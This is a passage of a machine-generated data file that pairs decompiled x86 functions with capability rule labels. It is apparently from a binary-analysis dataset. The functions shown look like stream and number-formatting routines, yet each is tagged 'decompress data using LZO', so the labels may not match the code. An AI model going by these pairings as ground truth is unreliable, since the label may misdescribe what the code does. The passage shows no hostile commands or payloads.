var_34h = iVar5 + 0x26;\n    uVar2 = *(arg_10h + 0xc);\n    uStackY116 = 0x455f03;\n    iVar6 = fcn.00418950();\n    iVar6 = -iVar6;\n    puVar13 = &stack0xffffff90 + iVar6;\n    puVar12 = &stack0xffffff90 + iVar6;\n    uVar7 = uVar2 & 0x4a;\n    *(&stack0xffffff94 + iVar6) = arg_18h;\n    puVar10 = &fcn.00455eb0::var_48h + iVar6 + 3 & 0xfffffff0;\n    var_48h = uVar7;\n    *(&stack0xffffffa0 + iVar6) = uVar2;\n    var_3ch = puVar10;\n    bVar9 = uVar7 != 0x40 && uVar7 != 8;\n    var_34h = var_34h & 0xffffff00 | bVar9;\n    *(&stack0xffffffa4 + iVar6) = bVar9;\n    uVar7 = var_30h;\n    *(&stack0xffffff9c + iVar6) = iVar5 + 0x26;\n    *(&stack0xffffff98 + iVar6) = uVar7;\n    *(&stack0xffffff90 + iVar6) = puVar10 + 0x28;\n    *(&stack0xffffff8c + iVar6) = 0x455f50;\n    iVar8 = fcn.0049d680();\n    puVar10 = var_3ch + (0x28 - iVar8);\n    if (*(iVar5 + 0x10) == '\\0') {\n    }\n    else {\n        *(&stack0xffffff8c + iVar6) = 0x455fcf;\n        uVar17 = fcn.00418950();\n        iVar11 = uVar17 >> 0x20;\n        iVar4 = -uVar17;\n        puVar13 = &stack0xffffff90 + iVar4 + iVar6;\n        puVar12 = &stack0xffffff90 + iVar4 + iVar6;\n        *(&stack0xffffffa4 + iVar4 + iVar6) = iVar8 + iVar11;\n        *(&stack0xffffffa0 + iVar4 + iVar6) = iVar11;\n        puVar10 = (&fcn.00455eb0::var_48h + iVar4 + iVar6 + 3 & 0xfffffff0U) + 2;\n        *(&stack0xffffff9c + iVar4 + iVar6) = *(iVar5 + 0xc);\n        var_3ch = puVar10;\n        *(&stack0xffffff98 + iVar4 + iVar6) = *(iVar5 + 8);\n        cVar1 = *(iVar5 + 0x25);\n        *(&stack0xffffff90 + iVar4 + iVar6) = puVar10;\n        *(&stack0xffffff94 + iVar4 + iVar6) = cVar1;\n        *(&stack0xffffff8c + iVar4 + iVar6) = 0x456006;\n        iVar8 = fcn.0049d950();\n        iVar8 = iVar8 - var_3ch;\n        puVar10 = var_3ch;\n    }\n    puVar16 = puVar10;\n    if (((var_34h == '\\0') && (puVar13 = puVar12,  (uVar2 & 0x200) != 0)) && ((var_44h | var_30h) != 0)) {\n        if (var_48h == 0x40) {\n            iVar8 = iVar8 + 1;\n            puVar16 = puVar10 + -1;\n            *puVar16 = *(iVar5 + 0x2a);\n        }\n        else {\n            iVar8 = iVar8 + 2;\n            puVar16 = puVar10 + -2;\n            puVar10[-1] = *(iVar5 + 0x28 + (uVar2 >> 0xe & 1));\n            *puVar16 = *(iVar5 + 0x2a);\n        }\n    }\n    iVar6 = *(arg_10h + 8);\n    puVar14 = puVar13;\n    if (iVar8 < iVar6) {\n        *(puVar13 + -4) = 0x45606e;\n        uVar17 = fcn.00418950();\n        iVar5 = -uVar17;\n        puVar14 = puVar13 + iVar5;\n        *(puVar13 + iVar5 + 0x14) = iVar8;\n        *(puVar13 + iVar5 + 4) = var_40h;\n        puVar16 = puVar13 + iVar5 + 0x27 & 0xfffffff0;\n        *(puVar13 + iVar5 + 0xc) = uVar17 >> 0x20;\n        *(puVar13 + iVar5 + 0x10) = iVar6;\n        *(puVar13 + iVar5 + 8) = puVar16;\n        *(puVar13 + iVar5) = arg_10h;\n        *(puVar13 + iVar5 + -4) = 0x45609c;\n        fcn.0048c3b0();\n        iVar8 = iVar6;\n    }\n    uVar15 = var_38h;\n    *(arg_10h + 8) = 0;\n    if (var_38h == '\\0') {\n        iVar6 = *var_2ch;\n        puVar14[1] = iVar8;\n        *puVar14 = puVar16;\n        pcVar3 = *(iVar6 + 0x30);\n        puVar14[-1] = 0x455f9a;\n        iVar6 = (*pcVar3)();\n        if (iVar6 != iVar8) {\n            uVar15 = 1;\n        }\n    }\n    return CONCAT44(uVar15, var_2ch) & 0xffffffffff;\n}\n",
        "token_count": 1707
    },
    "00456180": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl fcn.00456180(int32_t *arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    uint uVar8;\n    int32_t *piVar9;\n    char **ppcVar10;\n    uchar *puVar11;\n    char **ppcVar12;\n    char *pcVar13;\n    char *pcVar14;\n    bool bVar15;\n    ulong uVar16;\n    ulong in_stack_00000018;\n    uint uStackY148;\n    int32_t iStackY144;\n    int32_t *piStack136;\n    int32_t iStack132;\n    uchar auStack128 [27];\n    uchar auStack101 [5];\n    int32_t *var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    int32_t var_4ch;\n    uint var_48h;\n    uint uStack72;\n    int32_t *var_40h;\n    char *s;\n    char *var_31h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_bp_ch;\n    \n    var_40h = arg_8h;\n    _var_48h = in_stack_00000018;\n    var_50h = arg_ch;\n    var_58h = arg_14h;\n    iStackY144 = 0x4561b8;\n    var_4ch = fcn.0042e410(arg_10h + 0x6c);\n    iVar7 = *(arg_10h + 4);\n    if (iVar7 < 0) {\n        iVar7 = 6;\n    }\n    piStack136 = arg_18h;\n    iStackY144 = arg_10h;\n    uStackY148 = 0x4561e9;\n    fcn.0046dfb0();\n    uStackY148 = 0x456201;\n    uVar16 = fcn.00418950();\n    iVar2 = -uVar16;\n    piVar9 = &stack0xffffff70 + iVar2;\n    s = &stack0xffffff9b + iVar2 & 0xfffffff0;\n    if (uVar16 >> 0x20 == 0x104) {\n        *(&stack0xffffff6c + iVar2) = 0x4564aa;\n        var_2ch = fcn.0048f260();\n        uVar16 = _var_48h;\n        *(&stack0xffffff7c + iVar2) = &fcn.00456180::var_28h;\n        pcVar3 = s;\n        *(&stack0xffffff78 + iVar2) = 0x2d;\n        *(&stack0xffffff74 + iVar2) = pcVar3;\n        *(&stack0xffffff70 + iVar2) = &fcn.00456180::var_2ch;\n        *(&stack0xffffff80 + iVar2) = uVar16;\n        *(&stack0xffffff6c + iVar2) = 0x4564d2;\n        *NULL = fcn.0049df90();\n        if (0x2c < *NULL) {\n            var_5ch = *NULL + 1;\n            *(&stack0xffffff6c + iVar2) = 0x4564f2;\n            iVar7 = fcn.00418950();\n            iVar7 = -iVar7;\n            piVar9 = &stack0xffffff70 + iVar7 + iVar2;\n            s = &stack0xffffff9b + iVar7 + iVar2 & 0xfffffff0;\n            *(&stack0xffffff6c + iVar7 + iVar2) = 0x456503;\n            var_2ch = fcn.0048f260();\n            uVar16 = _var_48h;\n            piVar6 = var_5ch;\n            *(&stack0xffffff7c + iVar7 + iVar2) = &fcn.00456180::var_28h;\n            pcVar3 = s;\n            *(&stack0xffffff78 + iVar7 + iVar2) = piVar6;\n            *(&stack0xffffff74 + iVar7 + iVar2) = pcVar3;\n            *(&stack0xffffff70 + iVar7 + iVar2) = &fcn.00456180::var_2ch;\n            *(&stack0xffffff80 + iVar7 + iVar2) = uVar16;\n            *(&stack0xffffff6c + iVar7 + iVar2) = 0x456527;\n            *NULL = fcn.0049df90();\n        }\n    }\n    else {\n        *(&stack0xffffff6c + iVar2) = 0x45621e;\n        var_2ch = fcn.0048f260();\n        uVar16 = _var_48h;\n        *(&stack0xffffff80 + iVar2) = iVar7;\n        pcVar3 = s;\n        *(&stack0xffffff7c + iVar2) = &fcn.00456180::var_28h;\n        *(&stack0xffffff74 + iVar2) = pcVar3;\n        *(&stack0xffffff78 + iVar2) = 0x2d;\n        *(&stack0xffffff70 + iVar2) = &fcn.00456180::var_2ch;\n        *(&stack0xffffff84 + iVar2) = uVar16;\n        *(&stack0xffffff6c + iVar2) = 0x45624a;\n        *NULL = fcn.0049df90();\n        piVar9 = &stack0xffffff70 + iVar2;\n        if (0x2c < *NULL) {\n            var_5ch = *NULL + 1;\n            *(&stack0xffffff6c + iVar2) = 0x456364;\n            iVar4 = fcn.00418950();\n            iVar4 = -iVar4;\n            piVar9 = &stack0xffffff70 + iVar4 + iVar2;\n            s = &stack0xffffff9b + iVar4 + iVar2 & 0xfffffff0;\n            *(&stack0xffffff6c + iVar4 + iVar2) = 0x456375;\n            var_2ch = fcn.0048f260();\n            uVar16 = _var_48h;\n            piVar6 = var_5ch;\n            *(&stack0xffffff80 + iVar4 + iVar2) = iVar7;\n            pcVar3 = s;\n            *(&stack0xffffff7c + iVar4 + iVar2) = &fcn.00456180::var_28h;\n            *(&stack0xffffff74 + iVar4 + iVar2) = pcVar3;\n            *(&stack0xffffff78 + iVar4 + iVar2) = piVar6;\n            *(&stack0xffffff70 + iVar4 + iVar2) = &fcn.00456180::var_2ch;\n            *(&stack0xffffff84 + iVar4 + iVar2) = uVar16;\n            *(&stack0xffffff6c + iVar4 + iVar2) = 0x4563a0;\n            *NULL = fcn.0049df90();\n        }\n    }\n    *piVar9 = arg_10h + 0x6c;\n    piVar9[-1] = 0x45625e;\n    fcn.004a0a80();\n    pcVar13 = stack0xffffffcc;\n    piVar9[-1] = 0x456273;\n    uVar16 = fcn.00418950();\n    pcVar3 = s;\n    piVar6 = uVar16 >> 0x20;\n    iVar7 = -uVar16;\n    ppcVar12 = piVar9 + iVar7;\n    pcVar14 = piVar9 + iVar7 + 0x2b & 0xfffffff0;\n    _var_48h = CONCAT44(uStack72, piVar9 + iVar7 + 0x2b) & 0xfffffffffffffff0;\n    if (*(piVar6 + 7) == '\\x01') {\n        *(piVar9 + iVar7 + 8) = pcVar13;\n        *(piVar9 + iVar7) = pcVar14;\n        *(piVar9 + iVar7 + 4) = pcVar3;\n        *(piVar9 + iVar7 + -4) = 0x4565e3;\n        sub.msvcrt.dll_memcpy();\n    }\n    else {\n        if (*(piVar6 + 7) == '\\0') {\n            var_5ch = piVar6;\n            *(piVar9 + iVar7 + -4) = 0x45653a;\n            fcn.00431cc0();\n            pcVar1 = *(*var_5ch + 0x1c);\n            pcVar3 = s;\n        }\n        else {\n            pcVar1 = *(*piVar6 + 0x1c);\n        }\n        s = pcVar3;\n        if (pcVar1 == 0x431f40) {\n            *(piVar9 + iVar7 + 8) = pcVar13;\n            *(piVar9 + iVar7) = pcVar14;\n            *(piVar9 + iVar7 + 4) = pcVar3;\n            *(piVar9 + iVar7 + -4) = 0x4562b6;\n            sub.msvcrt.dll_memcpy();\n            ppcVar12 = piVar9 + iVar7;\n            pcVar13 = stack0xffffffcc;\n        }\n        else {\n            *(piVar9 + iVar7 + 8) = pcVar14;\n            *(piVar9 + iVar7) = pcVar3;\n            *(piVar9 + iVar7 + 4) = pcVar13 + pcVar3;\n            puVar11 = piVar9 + iVar7 + -4;\n            *(piVar9 + iVar7 + -4) = 0x456561;\n            (*pcVar1)();\n            ppcVar12 = puVar11 + -0xc;\n            pcVar13 = stack0xffffffcc;\n        }\n    }\n    pcVar3 = s;\n    if (pcVar13 == NULL) {\n        if (*(var_4ch + 0x10) != '\\0') goto code_r0x004563bf;\ncode_r0x004562fb:\n        pcVar3 = *(arg_10h + 8);\n        ppcVar10 = ppcVar12;\n        if (pcVar3 <= pcVar13) goto code_r0x00456309;\n    }\n    else {\n        ppcVar12[2] = pcVar13;\n        ppcVar12[1] = 0x2e;\n        *ppcVar12 = pcVar3;\n        ppcVar12[-1] = 0x4562da;\n        iVar7 = sub.msvcrt.dll_memchr();\n        if (iVar7 == 0) {\n            if ((*(var_4ch + 0x10) != '\\0') &&\n               ((pcVar13 < 3 ||\n                (((s[1] < ':' && (var_5ch = var_5ch & 0xffffff00 | s[2],  s[2] - 0x30U < 10)) && ('/' < s[1]))))))\n            goto code_r0x004563bf;\n            goto code_r0x004562fb;\n        }\n        pcVar14[iVar7 - s] = *(var_4ch + 0x24);\n        if (*(var_4ch + 0x10) == '\\0') goto code_r0x004562fb;\ncode_r0x004563bf:\n        ppcVar12[-1] = 0x4563ce;\n        uVar16 = fcn.00418950();\n        iVar7 = -uVar16;\n        pcVar5 = ppcVar12 + iVar7 + 0x2b & 0xfffffff0;\n        bVar15 = (*s - 0x2bU & 0xfd) == 0;\n        pcVar3 = pcVar5;\n        if (bVar15) {\n            _var_48h = _var_48h & 0xffffffff00000000 | ZEXT48(pcVar14 + 1);\n            *pcVar5 = *pcVar14;\n            stack0xffffffcc = pcVar13 + -1;\n            pcVar3 = pcVar5 + 1;\n        }\n        s = pcVar5;\n        *(ppcVar12 + iVar7 + 0x18) = &fcn.00456180::var_31h + 1;\n        *(ppcVar12 + iVar7 + 0x14) = var_48h;\n        iVar2 = var_4ch;\n        *(ppcVar12 + iVar7 + 0x10) = pcVar3;\n        *(ppcVar12 + iVar7 + 0xc) = uVar16 >> 0x20;\n        *(ppcVar12 + iVar7 + 8) = *(iVar2 + 0x25);\n        *(ppcVar12 + iVar7 + 4) = *(iVar2 + 0xc);\n        *(ppcVar12 + iVar7) = *(iVar2 + 8);\n        *(ppcVar12 + iVar7 + -4) = 0x45643e;\n        fcn.004560c0();\n        pcVar13 = stack0xffffffcc + bVar15;\n        ppcVar10 = ppcVar12 + iVar7 + -0x1c;\n        ppcVar12 = ppcVar12 + iVar7 + -0x1c;\n        stack0xffffffcc = pcVar13;\n        _var_48h = _var_48h & 0xffffffff00000000 | ZEXT48(s);\n        pcVar3 = *(arg_10h + 8);\n        if (pcVar3 <= pcVar13) goto code_r0x00456309;\n    }\n    *(ppcVar10 + -4) = 0x456469;\n    iVar7 = fcn.00418950();\n    iVar7 = -iVar7;\n    ppcVar12 = ppcVar10 + iVar7;\n    *(ppcVar10 + iVar7 + 0x14) = pcVar13;\n    *(ppcVar10 + iVar7 + 0xc) = var_48h;\n    *(ppcVar10 + iVar7 + 0x10) = pcVar3;\n    *(ppcVar10 + iVar7 + 4) = var_58h;\n    *(ppcVar10 + iVar7 + 8) = ppcVar10 + iVar7 + 0x2b & 0xfffffff0;\n    *(ppcVar10 + iVar7) = arg_10h;\n    *(ppcVar10 + iVar7 + -4) = 0x45649a;\n    fcn.0048c3b0();\n    stack0xffffffcc = pcVar3;\n    _var_48h = _var_48h & 0xffffffff00000000 | ZEXT48(ppcVar10 + iVar7 + 0x2b) & 0xfffffffffffffff0;\n    pcVar13 = pcVar3;\ncode_r0x00456309:\n    uVar8 = var_50h;\n    *(arg_10h + 8) = 0;\n    if (var_50h == '\\0') {\n        iVar7 = *var_40h;\n        ppcVar12[1] = pcVar13;\n        *ppcVar12 = var_48h;\n        pcVar1 = *(iVar7 + 0x30);\n        ppcVar12[-1] = 0x45632e;\n        pcVar3 = (*pcVar1)();\n        if (pcVar3 != pcVar13) {\n            uVar8 = 1;\n        }\n    }\n    return CONCAT44(uVar8, var_40h) & 0xffffffffff;\n}\n",
        "token_count": 3545
    },
    "004565f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl fcn.004565f0(int32_t *arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    uint uVar8;\n    int32_t *piVar9;\n    char **ppcVar10;\n    uchar *puVar11;\n    char **ppcVar12;\n    char *pcVar13;\n    char *pcVar14;\n    bool bVar15;\n    ulong uVar16;\n    unkbyte10 in_stack_00000018;\n    uint uStackY132;\n    int32_t iStackY128;\n    char *pcStack120;\n    int32_t iStack116;\n    uchar auStack112 [20];\n    int32_t *var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t *var_44h;\n    char *var_40h;\n    char *s;\n    char *var_31h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_bp_ch;\n    \n    var_44h = arg_8h;\n    var_4ch = arg_ch;\n    var_54h = arg_14h;\n    iStackY128 = 0x456622;\n    var_48h = fcn.0042e410(arg_10h + 0x6c);\n    iVar7 = *(arg_10h + 4);\n    if (iVar7 < 0) {\n        iVar7 = 6;\n    }\n    pcStack120 = arg_18h;\n    iStackY128 = arg_10h;\n    uStackY132 = 0x456653;\n    fcn.0046dfb0();\n    uStackY132 = 0x45666b;\n    uVar16 = fcn.00418950();\n    iVar2 = -uVar16;\n    piVar9 = &stack0xffffff80 + iVar2;\n    s = &fcn.004565f0::var_50h + iVar2 + 3 & 0xfffffff0;\n    if (uVar16 >> 0x20 == 0x104) {\n        *(&stack0xffffff7c + iVar2) = 0x45691a;\n        var_2ch = fcn.0048f260();\n        *(&stack0xffffff8c + iVar2) = &fcn.004565f0::var_28h;\n        pcVar3 = s;\n        *(&stack0xffffff88 + iVar2) = 0x36;\n        *(&stack0xffffff90 + iVar2) = in_stack_00000018;\n        *(&stack0xffffff84 + iVar2) = pcVar3;\n        *(&stack0xffffff80 + iVar2) = &fcn.004565f0::var_2ch;\n        *(&stack0xffffff7c + iVar2) = 0x456942;\n        *NULL = fcn.0049df90();\n        if (0x35 < *NULL) {\n            var_40h = *NULL + 1;\n            *(&stack0xffffff7c + iVar2) = 0x456962;\n            iVar7 = fcn.00418950();\n            iVar7 = -iVar7;\n            piVar9 = &stack0xffffff80 + iVar7 + iVar2;\n            s = &fcn.004565f0::var_50h + iVar7 + iVar2 + 3 & 0xfffffff0;\n            *(&stack0xffffff7c + iVar7 + iVar2) = 0x456973;\n            var_2ch = fcn.0048f260();\n            pcVar3 = var_40h;\n            *(&stack0xffffff8c + iVar7 + iVar2) = &fcn.004565f0::var_28h;\n            pcVar13 = s;\n            *(&stack0xffffff88 + iVar7 + iVar2) = pcVar3;\n            *(&stack0xffffff90 + iVar7 + iVar2) = in_stack_00000018;\n            *(&stack0xffffff84 + iVar7 + iVar2) = pcVar13;\n            *(&stack0xffffff80 + iVar7 + iVar2) = &fcn.004565f0::var_2ch;\n            *(&stack0xffffff7c + iVar7 + iVar2) = 0x456997;\n            *NULL = fcn.0049df90();\n        }\n    }\n    else {\n        *(&stack0xffffff7c + iVar2) = 0x456688;\n        var_2ch = fcn.0048f260();\n        *(&stack0xffffff90 + iVar2) = iVar7;\n        pcVar3 = s;\n        *(&stack0xffffff8c + iVar2) = &fcn.004565f0::var_28h;\n        *(&stack0xffffff94 + iVar2) = in_stack_00000018;\n        *(&stack0xffffff84 + iVar2) = pcVar3;\n        *(&stack0xffffff88 + iVar2) = 0x36;\n        *(&stack0xffffff80 + iVar2) = &fcn.004565f0::var_2ch;\n        *(&stack0xffffff7c + iVar2) = 0x4566b4;\n        *NULL = fcn.0049df90();\n        piVar9 = &stack0xffffff80 + iVar2;\n        if (0x35 < *NULL) {\n            var_40h = *NULL + 1;\n            *(&stack0xffffff7c + iVar2) = 0x4567d4;\n            iVar4 = fcn.00418950();\n            iVar4 = -iVar4;\n            piVar9 = &stack0xffffff80 + iVar4 + iVar2;\n            s = &fcn.004565f0::var_50h + iVar4 + iVar2 + 3 & 0xfffffff0;\n            *(&stack0xffffff7c + iVar4 + iVar2) = 0x4567e5;\n            var_2ch = fcn.0048f260();\n            pcVar3 = var_40h;\n            *(&stack0xffffff90 + iVar4 + iVar2) = iVar7;\n            pcVar13 = s;\n            *(&stack0xffffff8c + iVar4 + iVar2) = &fcn.004565f0::var_28h;\n            *(&stack0xffffff94 + iVar4 + iVar2) = in_stack_00000018;\n            *(&stack0xffffff84 + iVar4 + iVar2) = pcVar13;\n            *(&stack0xffffff88 + iVar4 + iVar2) = pcVar3;\n            *(&stack0xffffff80 + iVar4 + iVar2) = &fcn.004565f0::var_2ch;\n            *(&stack0xffffff7c + iVar4 + iVar2) = 0x456810;\n            *NULL = fcn.0049df90();\n        }\n    }\n    *piVar9 = arg_10h + 0x6c;\n    piVar9[-1] = 0x4566c8;\n    fcn.004a0a80();\n    pcVar13 = stack0xffffffcc;\n    piVar9[-1] = 0x4566dd;\n    uVar16 = fcn.00418950();\n    pcVar3 = s;\n    piVar6 = uVar16 >> 0x20;\n    iVar7 = -uVar16;\n    ppcVar12 = piVar9 + iVar7;\n    pcVar14 = piVar9 + iVar7 + 0x2f & 0xfffffff0;\n    var_40h = pcVar14;\n    if (*(piVar6 + 7) == '\\x01') {\n        *(piVar9 + iVar7 + 8) = pcVar13;\n        *(piVar9 + iVar7) = pcVar14;\n        *(piVar9 + iVar7 + 4) = pcVar3;\n        *(piVar9 + iVar7 + -4) = 0x456a53;\n        sub.msvcrt.dll_memcpy();\n    }\n    else {\n        if (*(piVar6 + 7) == '\\0') {\n            var_58h = piVar6;\n            *(piVar9 + iVar7 + -4) = 0x4569aa;\n            fcn.00431cc0();\n            pcVar1 = *(*var_58h + 0x1c);\n            pcVar3 = s;\n        }\n        else {\n            pcVar1 = *(*piVar6 + 0x1c);\n        }\n        s = pcVar3;\n        if (pcVar1 == 0x431f40) {\n            *(piVar9 + iVar7 + 8) = pcVar13;\n            *(piVar9 + iVar7) = pcVar14;\n            *(piVar9 + iVar7 + 4) = pcVar3;\n            *(piVar9 + iVar7 + -4) = 0x456720;\n            sub.msvcrt.dll_memcpy();\n            ppcVar12 = piVar9 + iVar7;\n            pcVar13 = stack0xffffffcc;\n        }\n        else {\n            *(piVar9 + iVar7 + 8) = pcVar14;\n            *(piVar9 + iVar7) = pcVar3;\n            *(piVar9 + iVar7 + 4) = pcVar13 + pcVar3;\n            puVar11 = piVar9 + iVar7 + -4;\n            *(piVar9 + iVar7 + -4) = 0x4569d1;\n            (*pcVar1)();\n            ppcVar12 = puVar11 + -0xc;\n            pcVar13 = stack0xffffffcc;\n        }\n    }\n    pcVar3 = s;\n    if (pcVar13 == NULL) {\n        if (*(var_48h + 0x10) != '\\0') goto code_r0x0045682f;\ncode_r0x00456765:\n        pcVar3 = *(arg_10h + 8);\n        ppcVar10 = ppcVar12;\n        if (pcVar3 <= pcVar13) goto code_r0x00456773;\n    }\n    else {\n        ppcVar12[2] = pcVar13;\n        ppcVar12[1] = 0x2e;\n        *ppcVar12 = pcVar3;\n        ppcVar12[-1] = 0x456744;\n        iVar7 = sub.msvcrt.dll_memchr();\n        if (iVar7 == 0) {\n            if ((*(var_48h + 0x10) != '\\0') &&\n               ((pcVar13 < 3 ||\n                (((s[1] < ':' && (var_58h = var_58h & 0xffffff00 | s[2],  s[2] - 0x30U < 10)) && ('/' < s[1]))))))\n            goto code_r0x0045682f;\n            goto code_r0x00456765;\n        }\n        pcVar14[iVar7 - s] = *(var_48h + 0x24);\n        if (*(var_48h + 0x10) == '\\0') goto code_r0x00456765;\ncode_r0x0045682f:\n        ppcVar12[-1] = 0x45683e;\n        uVar16 = fcn.00418950();\n        iVar7 = -uVar16;\n        pcVar5 = ppcVar12 + iVar7 + 0x2f & 0xfffffff0;\n        bVar15 = (*s - 0x2bU & 0xfd) == 0;\n        pcVar3 = pcVar5;\n        if (bVar15) {\n            var_40h = pcVar14 + 1;\n            *pcVar5 = *pcVar14;\n            stack0xffffffcc = pcVar13 + -1;\n            pcVar3 = pcVar5 + 1;\n        }\n        pcVar13 = var_40h;\n        s = pcVar5;\n        *(ppcVar12 + iVar7 + 0x18) = &fcn.004565f0::var_31h + 1;\n        *(ppcVar12 + iVar7 + 0x14) = pcVar13;\n        iVar2 = var_48h;\n        *(ppcVar12 + iVar7 + 0x10) = pcVar3;\n        *(ppcVar12 + iVar7 + 0xc) = uVar16 >> 0x20;\n        *(ppcVar12 + iVar7 + 8) = *(iVar2 + 0x25);\n        *(ppcVar12 + iVar7 + 4) = *(iVar2 + 0xc);\n        *(ppcVar12 + iVar7) = *(iVar2 + 8);\n        *(ppcVar12 + iVar7 + -4) = 0x4568ae;\n        fcn.004560c0();\n        pcVar13 = stack0xffffffcc + bVar15;\n        ppcVar10 = ppcVar12 + iVar7 + -0x1c;\n        ppcVar12 = ppcVar12 + iVar7 + -0x1c;\n        stack0xffffffcc = pcVar13;\n        var_40h = s;\n        pcVar3 = *(arg_10h + 8);\n        if (pcVar3 <= pcVar13) goto code_r0x00456773;\n    }\n    *(ppcVar10 + -4) = 0x4568d9;\n    iVar7 = fcn.00418950();\n    pcVar14 = var_40h;\n    iVar7 = -iVar7;\n    ppcVar12 = ppcVar10 + iVar7;\n    *(ppcVar10 + iVar7 + 0x14) = pcVar13;\n    *(ppcVar10 + iVar7 + 0xc) = pcVar14;\n    *(ppcVar10 + iVar7 + 0x10) = pcVar3;\n    *(ppcVar10 + iVar7 + 4) = var_54h;\n    *(ppcVar10 + iVar7 + 8) = ppcVar10 + iVar7 + 0x2f & 0xfffffff0;\n    *(ppcVar10 + iVar7) = arg_10h;\n    *(ppcVar10 + iVar7 + -4) = 0x45690a;\n    fcn.0048c3b0();\n    stack0xffffffcc = pcVar3;\n    var_40h = ppcVar10 + iVar7 + 0x2f & 0xfffffff0;\n    pcVar13 = pcVar3;\ncode_r0x00456773:\n    pcVar3 = var_40h;\n    uVar8 = var_4ch;\n    *(arg_10h + 8) = 0;\n    if (var_4ch == '\\0') {\n        iVar7 = *var_44h;\n        ppcVar12[1] = pcVar13;\n        *ppcVar12 = pcVar3;\n        pcVar1 = *(iVar7 + 0x30);\n        ppcVar12[-1] = 0x456798;\n        pcVar3 = (*pcVar1)();\n        if (pcVar3 != pcVar13) {\n            uVar8 = 1;\n        }\n    }\n    return CONCAT44(uVar8, var_44h) & 0xffffffffff;\n}\n",
        "token_count": 3470
    },
    "00456c30": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl fcn.00456c30(int32_t *arg_8h, uint32_t arg_ch, int32_t arg_10h, int32_t arg_14h, uint32_t arg_18h)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint extraout_ECX;\n    uchar *puVar7;\n    uint64_t uVar8;\n    uint32_t auStackY148 [2];\n    uchar auStack109 [5];\n    uint32_t var_64h;\n    int32_t var_60h;\n    int32_t var_5ch;\n    uint32_t var_58h;\n    uint32_t var_54h;\n    int32_t var_50h;\n    uint32_t var_4ch;\n    uint var_30h;\n    uint var_2ch;\n    uint var_19h;\n    uint var_ch;\n    \n    var_50h = arg_14h;\n    var_54h = *(arg_10h + 0xc);\n    if ((var_54h & 1) == 0) {\n        var_50h._0_1_ = arg_14h;\n        auStackY148[1] = 0x456c74;\n        uVar8 = fcn.00455810(arg_8h, arg_ch, arg_10h, var_50h, arg_18h & 0xff);\n        return uVar8 & 0xffffffff | (arg_ch & 0xffffff00 | uVar8 >> 0x20 & 0xff) << 0x20;\n    }\n    var_58h = arg_18h;\n    var_4ch = var_4ch & 0xffffff00 | arg_ch & 0xff;\n    auStackY148[1] = 0x456ca8;\n    iVar4 = fcn.0042e410(arg_10h + 0x6c);\n    if (var_58h == '\\0') {\n        var_58h = *(iVar4 + 0x1c);\n        iVar4 = *(iVar4 + 0x20);\n        iVar6 = *(arg_10h + 8);\n        if (iVar4 < iVar6) goto code_r0x00456d14;\ncode_r0x00456cc2:\n        *(arg_10h + 8) = 0;\n        if (var_4ch != '\\0') goto code_r0x00456cef;\n    }\n    else {\n        var_58h = *(iVar4 + 0x14);\n        iVar4 = *(iVar4 + 0x18);\n        iVar6 = *(arg_10h + 8);\n        if (iVar6 <= iVar4) goto code_r0x00456cc2;\ncode_r0x00456d14:\n        var_60h = iVar6 - iVar4;\n        auStackY148[0] = 0x456d2c;\n        var_5ch = iVar4;\n        iVar4 = fcn.00418950();\n        iVar4 = -iVar4;\n        *(&stack0xffffff78 + iVar4) = extraout_ECX;\n        var_64h = &stack0xffffff93 + iVar4 & 0xfffffff0;\n        *(&stack0xffffff70 + iVar4) = &stack0xffffff93 + iVar4 & 0xfffffff0;\n        *(&stack0xffffff74 + iVar4) = var_50h;\n        *(&stack0xffffff6c + iVar4) = 0x456d4e;\n        sub.msvcrt.dll_memset();\n        uVar3 = var_58h;\n        iVar5 = var_5ch;\n        iVar6 = var_60h;\n        uVar2 = var_64h;\n        *(arg_10h + 8) = 0;\n        if ((var_54h & 0xb0) == 0x20) {\n            if (var_4ch != '\\0') goto code_r0x00456cef;\n            iVar6 = *arg_8h;\n            *(&stack0xffffff74 + iVar4) = var_5ch;\n            var_4ch = iVar5;\n            *(&stack0xffffff70 + iVar4) = uVar3;\n            pcVar1 = *(iVar6 + 0x30);\n            puVar7 = &stack0xffffff6c + iVar4;\n            *(&stack0xffffff6c + iVar4) = 0x456dbe;\n            iVar6 = (*pcVar1)();\n            iVar4 = var_60h;\n            uVar2 = var_64h;\n            if (var_4ch == iVar6) {\n                iVar6 = *arg_8h;\n                *(puVar7 + -4) = var_60h;\n                *(puVar7 + -8) = uVar2;\n                pcVar1 = *(iVar6 + 0x30);\n                *(puVar7 + -0xc) = 0x456ddc;\n                iVar6 = (*pcVar1)();\n                var_4ch = iVar4 != iVar6;\n                goto code_r0x00456cef;\n            }\ncode_r0x00456d90:\n            var_4ch = 1;\n            goto code_r0x00456cef;\n        }\n        var_50h = var_5ch;\n        if (var_4ch != '\\0') goto code_r0x00456cef;\n        iVar5 = *arg_8h;\n        *(&stack0xffffff74 + 